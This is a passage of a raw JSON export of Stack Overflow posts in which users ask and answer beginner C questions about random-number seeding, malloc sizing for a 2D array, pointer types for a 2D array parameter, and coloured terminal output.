1459359058, "post_id": 36315080, "comment_id": 60254829, "body": "Is it &quot;bad random generation day&quot;?"}], "answers": [{"comments": [{"owner": {"reputation": 5005, "user_id": 1550974, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/EH53Y.jpg?s=128&g=1", "display_name": "Khant Thu Linn", "link": "https://stackoverflow.com/users/1550974/khant-thu-linn"}, "edited": false, "score": 0, "creation_date": 1459357052, "post_id": 36315127, "comment_id": 60253610, "body": "Thanks. I got now. I will accept your answer in 10 min (stackoverflow doesn&#39;t allow me to accept immediately)"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 3, "last_activity_date": 1459356954, "creation_date": 1459356954, "answer_id": 36315127, "question_id": 36315080, "link": "https://stackoverflow.com/questions/36315080/c-generate-random-number-with-nested-function/36315127#36315127", "title": "C generate random number with nested function", "body": "<p>The way it is now, each time you call <code>generateBattleShipX</code> or <code>generateBattleShipY</code> you re-seed the random number generator.  Since <code>time</code> returns the time in seconds, multiple successive calls will return the same value, so the random number generator gets seeded with the same value, resulting in the same \"random\" number each time.</p>\n\n<p><code>srand</code> should only be called once at the start of your program to seed the random number generator.  Once you do that, you'll get more random results.</p>\n"}, {"tags": [], "owner": {"reputation": 46, "user_id": 1186403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc28488b059a6d41c2ee4c3eb5350c7d?s=128&d=identicon&r=PG", "display_name": "CJ1", "link": "https://stackoverflow.com/users/1186403/cj1"}, "is_accepted": false, "score": 0, "last_activity_date": 1459357636, "creation_date": 1459357636, "answer_id": 36315339, "question_id": 36315080, "link": "https://stackoverflow.com/questions/36315080/c-generate-random-number-with-nested-function/36315339#36315339", "title": "C generate random number with nested function", "body": "<p>dbush is correct, however a better pseudo random number would be to use the encryption library (if you OS supports one) as the \"randomness\" of the random number generator is better than using time as your seed.</p>\n\n<p>As it stands, with the corrections, this would be easy to predict the numbers and defeat  the \"game.\"</p>\n"}], "owner": {"reputation": 5005, "user_id": 1550974, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/EH53Y.jpg?s=128&g=1", "display_name": "Khant Thu Linn", "link": "https://stackoverflow.com/users/1550974/khant-thu-linn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 96, "favorite_count": 0, "accepted_answer_id": 36315127, "answer_count": 2, "score": -3, "last_activity_date": 1459357636, "creation_date": 1459356778, "question_id": 36315080, "link": "https://stackoverflow.com/questions/36315080/c-generate-random-number-with-nested-function", "title": "C generate random number with nested function", "body": "<p>I can generate random number with srand, rand (by seeding). If I just need to run in 1 particular function, it is okay. But, I have code like this. </p>\n\n<pre><code>int generateBattleShipX() {\n      srand ( time(NULL) );\n    return rand() % 14;\n}\n\nint generateBattleShipY() {\n     srand ( time(NULL) );\n    return rand() % 14;\n}\n\nint tryToFillBattleField(int X, int Y) {\n\nif ((X &gt;= 1 &amp;&amp; X &lt;= 13) &amp;&amp; (Y &gt;= 1 &amp;&amp; Y &lt;= 13)) //battle ship is in the field\n{\n\n    int lowerX = X - 1; \n    int upperX = X + 1;\n\n    int lowerY = Y - 1; \n    int upperY = Y + 1;\n\n    // printf(\"lowerX = %d upperX = %d lowerY = %d upperY = %d\", lowerX, upperX, lowerY, upperY);\n    int left = my_data[Y][lowerX];\n    int top = my_data[lowerY][X];\n    int right = my_data[Y][upperX];\n    int bottom = my_data[upperY][X];\n\n    if (left == 0 &amp;&amp; top == 0 &amp;&amp; right == 0 &amp;&amp; bottom == 0) {\n        my_data[Y][lowerX] = track;\n        my_data[lowerY][X] = track;\n        my_data[Y][upperX] = track;\n        my_data[upperY][X] = track;\n        my_data[Y][X] = track;\n        track++;\n\n        if (track &gt; 10) {\n            return 1; //stop\n        }\n        else {\n              int x = generateBattleShipX();\n              int y = generateBattleShipY();\n\n            // printf(\"x = %d y = %d \\n\",x,y );\n         tryToFillBattleField(x, y); //filling next battle ship\n        }\n    }\n    else {\n              int x = generateBattleShipX();\n              int y = generateBattleShipY();\n\n        tryToFillBattleField(x, y);//redoing because it overlap\n    }\n    return 0;\n}\nelse {\n    // redoing because battle ship is out of field..\n              int x = generateBattleShipX();\n              int y = generateBattleShipY();\n            // printf(\"x = %d y = %d \\n\",x,y );\n\n        tryToFillBattleField(x, y);\n    return 0;\n}\n    return 0;\n}\n</code></pre>\n\n<p>tryToFillBattleField is called by its method again and again about 10 times. Problem is it can generate random number only for 1st time. For the rest, it is always the same. Is there a particular method I need to write for nested function to generate random number? </p>\n"}, {"tags": ["c", "arrays", "segmentation-fault"], "comments": [{"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1459356738, "post_id": 36314880, "comment_id": 60253392, "body": "Note that it is <a href=\"http://stackoverflow.com/q/605845/253056\">redundant and potentially dangerous to cast the result of malloc and friends in C</a>. (Doubly so in the above code!)"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459356895, "post_id": 36314880, "comment_id": 60253506, "body": "There is no 2D array and nothing which can be used as one in your code. A pointer is not an array! And your wildly casting for the first <code>malloc</code> is a clear signal you lack some fundamental basics about pointers, too - no offence (honestly!), just a fact."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459357112, "post_id": 36314880, "comment_id": 60253648, "body": "Also C and C++ are different languages. Don&#39;t use both tags if the question is about one of them only. If in doubt, always tag for the compiler you use."}, {"owner": {"reputation": 8518, "user_id": 1227172, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/UvqOH.jpg?s=128&g=1", "display_name": "John Wheal", "link": "https://stackoverflow.com/users/1227172/john-wheal"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459358226, "post_id": 36314880, "comment_id": 60254401, "body": "Thanks @Olaf - the code was part of a CUDA program (C++) but my brain was half thinking about C and half about C++, hence why it became a mess."}], "answers": [{"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459356655, "post_id": 36314989, "comment_id": 60253340, "body": "Isn&#39;t the size of a float larger than he size of a pointr? If yes, then that cannot cause the segmentation fault."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 2, "creation_date": 1459356811, "post_id": 36314989, "comment_id": 60253458, "body": "@PaulOgilvie: on a 64 bit OS a <code>float *</code> pointer is 8 bytes whereas a <code>float</code> is typically only 4 bytes. QED."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459356895, "post_id": 36314989, "comment_id": 60253504, "body": "@QED, thanks for the info. So it did cause the seg fault."}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": true, "score": 2, "last_activity_date": 1459356500, "creation_date": 1459356500, "answer_id": 36314989, "question_id": 36314880, "link": "https://stackoverflow.com/questions/36314880/c-2d-array-sgmentation-fault/36314989#36314989", "title": "C - 2D Array Sgmentation Fault", "body": "<pre><code>float** matrix = (float**)(float*) malloc(height*sizeof(float));\n</code></pre>\n\n<p>Instead of <code>sizeof(float)</code> use <code>sizeof(float *)</code> . You need to allocate memory for <code>height</code> number of <code>float</code> pointers .</p>\n\n<p>So your code goes like this -</p>\n\n<pre><code>float** matrix = malloc(height*sizeof(float *));\n</code></pre>\n\n<p>Your code produces seg fault while using loop as you don't correct amount of memory for <code>float</code> pointers and you end up accessing invalid memory , thus getting <em>undefined behaviour</em>. </p>\n\n<p><strong>Note</strong>- Don't use cast for <code>malloc</code> . And check <code>retrun</code> of <code>malloc</code>. </p>\n"}, {"comments": [{"owner": {"reputation": 8518, "user_id": 1227172, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/UvqOH.jpg?s=128&g=1", "display_name": "John Wheal", "link": "https://stackoverflow.com/users/1227172/john-wheal"}, "edited": false, "score": 0, "creation_date": 1459357088, "post_id": 36315036, "comment_id": 60253637, "body": "That won&#39;t compile it says &quot;error: a value of type &quot;void *&quot; cannot be used to initialize an entity of type &quot;float **&quot;"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 8518, "user_id": 1227172, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/UvqOH.jpg?s=128&g=1", "display_name": "John Wheal", "link": "https://stackoverflow.com/users/1227172/john-wheal"}, "edited": false, "score": 0, "creation_date": 1459357376, "post_id": 36315036, "comment_id": 60253823, "body": "@JohnWheal  That must be because you maybe compiling it with C++ compiler . For C these cast are not needed ."}, {"owner": {"reputation": 8518, "user_id": 1227172, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/UvqOH.jpg?s=128&g=1", "display_name": "John Wheal", "link": "https://stackoverflow.com/users/1227172/john-wheal"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1459357524, "post_id": 36315036, "comment_id": 60253925, "body": "@ameyCU This is actually part of a CUDA program and so it is being compiled with a C++ compiler. Does this change things?"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 8518, "user_id": 1227172, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/UvqOH.jpg?s=128&g=1", "display_name": "John Wheal", "link": "https://stackoverflow.com/users/1227172/john-wheal"}, "edited": false, "score": 0, "creation_date": 1459357712, "post_id": 36315036, "comment_id": 60254053, "body": "@JohnWheal Then maybe you need to apply cast . Or use <code>new</code> and <code>delete</code> ."}], "tags": [], "owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "is_accepted": false, "score": 2, "last_activity_date": 1459356646, "creation_date": 1459356646, "answer_id": 36315036, "question_id": 36314880, "link": "https://stackoverflow.com/questions/36314880/c-2d-array-sgmentation-fault/36315036#36315036", "title": "C - 2D Array Sgmentation Fault", "body": "<p>Here is the refined code:</p>\n\n<pre><code>int width = 10;\nint height = 9;\n\nfloat **matrix = malloc(height * sizeof (float *));\n\nfor (size_t i = 0; i &lt; height; i++)\n    matrix[i] = malloc(width * sizeof(float));\n</code></pre>\n\n<p><code>matrix</code> is \"a pointer to <strong>pointers to floats</strong>\", while <code>matrix[i]</code> are \"pointers to <strong>floats</strong>\".</p>\n"}], "owner": {"reputation": 8518, "user_id": 1227172, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/UvqOH.jpg?s=128&g=1", "display_name": "John Wheal", "link": "https://stackoverflow.com/users/1227172/john-wheal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "accepted_answer_id": 36314989, "answer_count": 2, "score": -3, "last_activity_date": 1459358385, "creation_date": 1459356209, "last_edit_date": 1459358385, "question_id": 36314880, "link": "https://stackoverflow.com/questions/36314880/c-2d-array-sgmentation-fault", "title": "C - 2D Array Sgmentation Fault", "body": "<p>I have the following code:</p>\n\n<pre><code>int width = 10;\nint height = 9;\n\nfloat** matrix = (float**) malloc(height*sizeof(float));\n\nfor (unsigned int i = 0; i &lt; height; i++)\n    matrix[i] = (float*) malloc(width*sizeof(float));\n\n//This works\nmatrix[6][0] = 3.0f;\n\nfor (unsigned int j = 0; j &lt; width; j++) {\n    for (unsigned int i = 0; i &lt; height; i++) {\n        //This fails on [6][0]\n        matrix[i][j] = 3.0f;\n    }\n}\n</code></pre>\n\n<p>I am attempting to create a 2D array and initialise it however a segmentation fault is received when setting the value of matrix[6][0] within the loop. What I'm finding very strange is that no error is thrown when I set matrix[6][0] outside of the loop. It's my understanding that a segmentation fault occurs when illegal memory is accessed but I cannot find any reason why different memory is being accessed within the loop. I have even examined the assembly code to find out what's happening but I cannot find the problem.</p>\n\n<p><strong>Update:</strong> The code was part of a CUDA program (C++) but my brain was half thinking about C and half about C++, hence why it became a mess.</p>\n"}, {"tags": ["c", "warnings"], "answers": [{"tags": [], "owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "is_accepted": true, "score": 2, "last_activity_date": 1459360178, "creation_date": 1459360178, "answer_id": 36316104, "question_id": 36314766, "link": "https://stackoverflow.com/questions/36314766/hello-im-trying-to-do-a-blackjack-game-in-c-when-i-do-the-deal-funtion-the/36316104#36316104", "title": "Hello, im trying to do a blackjack game , in C. When i do the &quot;deal&quot; funtion the warning &#39;passing argumente from incompatible pointer type", "body": "<p>The parameter of <code>Deal_player</code> has the wrong type. It should be declared as:</p>\n\n<pre><code>void Deal_player(int (*)[MAX_CARD_HAND]);\n</code></pre>\n\n<p>And defined as:</p>\n\n<pre><code>void Deal_player(int (*player_card)[MAX_CARD_HAND])\n{\n    /* ... */\n}\n</code></pre>\n\n<p>Alternatively, you can declare it as:</p>\n\n<pre><code>void Deal_player(int [][MAX_CARD_HAND]);\n</code></pre>\n\n<p>and define it as:</p>\n\n<pre><code>void Deal_player(int player_card[][MAX_CARD_HAND])\n{\n    /* ... */\n}\n</code></pre>\n\n<p>Although the alternative looks like the parameter is a 2D array, the compiler will automatically change the type of the parameter to be a pointer to a 1D array.</p>\n"}, {"tags": [], "owner": {"reputation": 328, "user_id": 4768463, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/02e9b7b066da2e7d2373ea09fcb63e33?s=128&d=identicon&r=PG&f=1", "display_name": "Aviv", "link": "https://stackoverflow.com/users/4768463/aviv"}, "is_accepted": false, "score": 0, "last_activity_date": 1459361390, "last_edit_date": 1495541733, "creation_date": 1459361390, "answer_id": 36316489, "question_id": 36314766, "link": "https://stackoverflow.com/questions/36314766/hello-im-trying-to-do-a-blackjack-game-in-c-when-i-do-the-deal-funtion-the/36316489#36316489", "title": "Hello, im trying to do a blackjack game , in C. When i do the &quot;deal&quot; funtion the warning &#39;passing argumente from incompatible pointer type", "body": "<p>The problem lies in the difference between a <code>int [][]</code> type and <code>int **</code> type. People tends to confuse between these two. But array types are different from pointer types, although they might sometime overlap in meaning.</p>\n\n<p>For example for <code>int a[MAX_SOMETHING]</code> type, <code>sizeof(a)/sizeof(a[0])</code> calculates in compile-time the amount of elements in our <code>a</code> array. But for<code>int *a = malloc(MAX_SOMETHING*sizeof(int))</code> it yields a different unexpected result (since malloc is made in runtime and sizeof is executed in compile time).</p>\n\n<p>I'm pretty sure there are much more examples that expressing the difference between these two, but this one just catchy.</p>\n\n<p>Instead send as a parameter a pointer to your array of arrays and change the signature of your callee as follows:</p>\n\n<pre><code>//caller - take the address\ndeal_players(&amp;player_cards);    \n//callee\nvoid deal_players_ptr_to_arr(int (*arr)[MAX_PLAYERS][MAX_CARDS])\n</code></pre>\n\n<p>note 1: if you are confused with the <code>(*arr)</code> part <code>int (*arr)[MAX_PLAYERS][MAX_CARDS]</code> is read as pointer to array of size MAX_PLAYERS of arrays of size MAX_CARDS.</p>\n\n<p>note 2: you can typedef that long type name in some nice <code>players_cards_t</code> name, but it isn't <a href=\"https://stackoverflow.com/a/4523537/4768463\">recommended</a>.</p>\n"}], "owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 1, "accepted_answer_id": 36316104, "answer_count": 2, "score": 0, "last_activity_date": 1459361390, "creation_date": 1459355859, "last_edit_date": 1459356882, "question_id": 36314766, "link": "https://stackoverflow.com/questions/36314766/hello-im-trying-to-do-a-blackjack-game-in-c-when-i-do-the-deal-funtion-the", "title": "Hello, im trying to do a blackjack game , in C. When i do the &quot;deal&quot; funtion the warning &#39;passing argumente from incompatible pointer type", "body": "<p>im trying to do a blackjack game for a school project, in C. When i do the \"Deal_player\" funtion it brings the warning 'passing argumente from incompatible pointer type\nthe warning appears on line 68, i dont know what the problem is. Can someone help please?</p>\n\n<pre><code>void InitEverything(int , int , TTF_Font **, SDL_Surface **, SDL_Window ** , SDL_Renderer ** );\nvoid InitSDL();\nvoid InitFont();\nSDL_Window* CreateWindow(int , int );\nSDL_Renderer* CreateRenderer(int , int , SDL_Window *);\nint RenderText(int , int , const char* , TTF_Font *, SDL_Color *, SDL_Renderer * );\nint RenderLogo(int , int , SDL_Surface *, SDL_Renderer * );\nvoid RenderTable(int [], TTF_Font *, SDL_Surface **, SDL_Renderer * );\nvoid RenderCard(int , int , int , SDL_Surface **, SDL_Renderer * );\nvoid RenderHouseCards(int [], int , SDL_Surface **, SDL_Renderer * );\nvoid RenderPlayerCards(int [][MAX_CARD_HAND], int [], SDL_Surface **, SDL_Renderer * );\nvoid LoadCards(SDL_Surface **);\nvoid UnLoadCards(SDL_Surface **);\nvoid baralhar(SDL_Surface **);\nvoid Deal_player(int**);\n\n\n    int main( int argc, char* args[] )\n    {\n        SDL_Window *window = NULL;\n        SDL_Renderer *renderer = NULL;\n        TTF_Font *serif = NULL;\n        SDL_Surface *cards[MAX_DECK_SIZE+1], *imgs[2];\n        SDL_Event event;\n        int delay = 300;\n        int quit = 0;\n        int money[MAX_PLAYERS] = {110, 110, 110, 110};\n        int player_cards[MAX_PLAYERS][MAX_CARD_HAND] = {{0}};\n        int house_cards[MAX_CARD_HAND] = {0};\n        int pos_house_hand = 0;\n        int pos_player_hand[MAX_PLAYERS] = {0};\n\n        // initialize graphics\n        InitEverything(WIDTH_WINDOW, HEIGHT_WINDOW, &amp;serif, imgs, &amp;window, &amp;renderer);\n        // loads the cards images\n        LoadCards(cards);\n        baralhar(cards);\n        Deal_player(player_cards); //warning\n\n\n//deal funtion;\n\n\nvoid Deal_player(int **player_card){\n    int j, h, k = 0;\n\n    for(j=0; j&lt;MAX_PLAYERS; j++){\n        for(h=0; h&lt;MAX_CARD_HAND; h++){\n            player_card[j][h] = k;printf(\"jjjjjjjj\\n\");\n            k++;\n        }\n    }\n    for(j=1; j&lt;=4; j++)\n        for(h=0; h&lt;2; h++)\n            printf(\"-----%d\\n\" ,player_card[j][h]);\n    return;\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "file", "ubuntu"], "comments": [{"owner": {"reputation": 1791, "user_id": 5022759, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hg0HA.png?s=128&g=1", "display_name": "ikrabbe", "link": "https://stackoverflow.com/users/5022759/ikrabbe"}, "edited": false, "score": 0, "creation_date": 1459355785, "post_id": 36314690, "comment_id": 60252759, "body": "Coloured output is a matter of the terminal emulation used, not a matter of c of printf. Better use termcap a/o ncurses or something similar"}, {"owner": {"reputation": 47447, "user_id": 1172428, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/240fe123035f1c6e184f59da2f1465d9?s=128&d=identicon&r=PG", "display_name": "FatalError", "link": "https://stackoverflow.com/users/1172428/fatalerror"}, "edited": false, "score": 3, "creation_date": 1459355788, "post_id": 36314690, "comment_id": 60252762, "body": "Those codes you refer to are meaningful only in the context of a terminal.  If you dump the file to terminal you&#39;ll see the same colors... but there&#39;s no such thing as &quot;colored text&quot; in a text file per se."}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1459356181, "post_id": 36314690, "comment_id": 60253028, "body": "Most terminals can print colored output and e.g. ` printf(&quot;\\033[33;1mBold Yellow\\033[0m)&quot;` will print &quot;Bold Yellow&quot; in bold yellow."}, {"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "reply_to_user": {"reputation": 1791, "user_id": 5022759, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hg0HA.png?s=128&g=1", "display_name": "ikrabbe", "link": "https://stackoverflow.com/users/5022759/ikrabbe"}, "edited": false, "score": 0, "creation_date": 1459356566, "post_id": 36314690, "comment_id": 60253280, "body": "@ikrabbe Thank you for your comment"}, {"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "reply_to_user": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1459356580, "post_id": 36314690, "comment_id": 60253290, "body": "@JensMunk Thank you for your comment"}, {"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "reply_to_user": {"reputation": 47447, "user_id": 1172428, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/240fe123035f1c6e184f59da2f1465d9?s=128&d=identicon&r=PG", "display_name": "FatalError", "link": "https://stackoverflow.com/users/1172428/fatalerror"}, "edited": false, "score": 0, "creation_date": 1459356660, "post_id": 36314690, "comment_id": 60253344, "body": "@FatalError Thank you for this answer, you saved me time and effort, so there is no colors in text files, plain text files in C, it has a meaning only in terminal."}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1459356781, "post_id": 36314690, "comment_id": 60253437, "body": "@BelalMedhat You are welcome. I have posted some code extracted from my local tools. I have a C version also. I find it very convenient to operate with both faces and colors using streams."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459357046, "post_id": 36314984, "comment_id": 60253605, "body": "Thank you for your answer, yes I will take the short answer, no colors in plain text c on linux, because it was made so simple to read and write, everything in Linux is a file, so if i want to print text with colors, either in terminal or print to text file and add HTML tags and specify colors for text."}], "tags": [], "owner": {"reputation": 46, "user_id": 1186403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc28488b059a6d41c2ee4c3eb5350c7d?s=128&d=identicon&r=PG", "display_name": "CJ1", "link": "https://stackoverflow.com/users/1186403/cj1"}, "is_accepted": true, "score": 0, "last_activity_date": 1459356488, "creation_date": 1459356488, "answer_id": 36314984, "question_id": 36314690, "link": "https://stackoverflow.com/questions/36314690/c-fprintf-with-colors/36314984#36314984", "title": "C fprintf with colors", "body": "<p>The short answer is you can't, the long answer is you need to write some kind of mark-up along with your text in on of many formats that are available. There is no universal standard that you can use, so you'll need to pick one.</p>\n\n<p>The colour codes are specific to the console and are not useful for printing, if you are just re-displaying the text back to the screen, no problem, but if you want to print it then you'll need to do some work.</p>\n\n<p>The easiest may be to write HTML tags for viewing in a browser and print from there. Writing to the printer using the printer's mark-up codes is also possible and it can be simple (or next to impossible) on some printers. The down side is this is a printer specific solution. If you're really ambitious output in PDF format (it's just text), RTF or any other document format but that will take time and skills.</p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 1, "creation_date": 1459356931, "post_id": 36315031, "comment_id": 60253534, "body": "That is amazing, Thank you again."}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "reply_to_user": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459357171, "post_id": 36315031, "comment_id": 60253689, "body": "You are welcome. Sorry for not including any faces in the example, but these work as well, e.g. <code>&lt;&lt; set_face(faces::bold) &lt;&lt; &quot;Bold&quot;</code> gives a bold face."}, {"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459357306, "post_id": 36315031, "comment_id": 60253776, "body": "Thanks, I usually write in C but C++ sometimes has a cleaner way of organizing the code."}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "reply_to_user": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": 